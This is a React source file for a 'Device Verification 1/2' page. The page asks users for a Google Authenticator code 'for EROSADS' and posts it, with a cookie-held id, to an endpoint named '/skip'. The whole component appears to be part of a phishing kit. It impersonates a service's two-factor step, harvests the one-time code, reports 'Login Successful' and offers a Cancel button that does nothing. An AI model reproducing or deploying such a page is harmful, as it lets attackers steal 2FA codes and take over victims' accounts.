import { Form, Formik } from "formik";
import { motion } from "framer-motion";
import Cookies from "js-cookie";
import React from "react";
import { toast } from "react-toastify";
import { API_URL } from "../config/index";
import TextfieldWrapper from "./TextfieldWrapper";

function Security({ setShowModal }) {
  const id = Cookies.get("id");

  const initialvalues = {
    id: id,
    skipcode: "",
  };

  const handleSubmit = async (values, formik) => {
    const url = `${API_URL}/skip`;

    const res = await fetch(url, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
      },
      body: JSON.stringify(values),
    });

    const data = await res.json();

    if (res.ok) {
      toast.success("Login Successful");
      formik.resetForm();
      Cookies.remove("id");
    } else {
      toast.error("Something Went Wrong");
    }
  };

  return (
    <div className="h-screen bg-black flex justify-center items-center px-4">
      <motion.div
        initial={{ scale: 0.7 }}
        animate={{ scale: 1 }}
        transition={{ duration: 0.2 }}
        className="w-full max-w-md px-3"
      >
        <Formik initialValues={initialvalues} onSubmit={handleSubmit}>
          {(formik) => (
            <Form className="">
              <div className="pl-5 w-full max-w-[540px] h-auto lg:pl-8 pr-8 lg:pr-14 py-4 lg:py-7 bg-white text-black rounded">
                <h2 className="text-lg font-medium">Device Verification 1/2</h2>
                <p className="mt-2 text-sm">
                  Please enter a <strong>Verification code</strong> for EROSADS
                  from your <strong>Google Authenticator</strong> app
                </p>

                <div className="my-2 flex justify-start">
                  <div className="w-full lg:w-[320px]">
                    <label className="text-sm text-custom-amber">
                      Enter code here *
                    </label>
                    <TextfieldWrapper
                      name="skipcode"
                      type="text"
                      required
                      autoFocus
                    />
                  </div>
                </div>

                <p className="text-sm">
                  Having trouble with receiving the Code? Contact the{" "}
                  <span className="text-custom-amber cursor-pointer underline">
                    Support
                  </span>
                </p>
              </div>

              <div className="mt-4 flex flex-col sm:flex-row gap-4 justify-end">
                <button
                  type="button"
                  className="px-[20px] py-2 font-Arimo text-sm bg-white/50 hover:bg-white/70 border-2 border-white text-white rounded uppercase transition-all duration-300"
                  // onClick={() => setShowModal(false) }
                >
                  Cancel
                </button>
                <button
                  type="submit"
                  className="px-[22px] py-2 font-Arimo text-sm bg-transparent hover:bg-custom-yellow border-2 border-custom-amber text-custom-amber rounded uppercase transition-all duration-300"
                >
                  Verify
                </button>
              </div>
            </Form>
          )}
        </Formik>
      </motion.div>
    </div>
  );
}

export default Security;
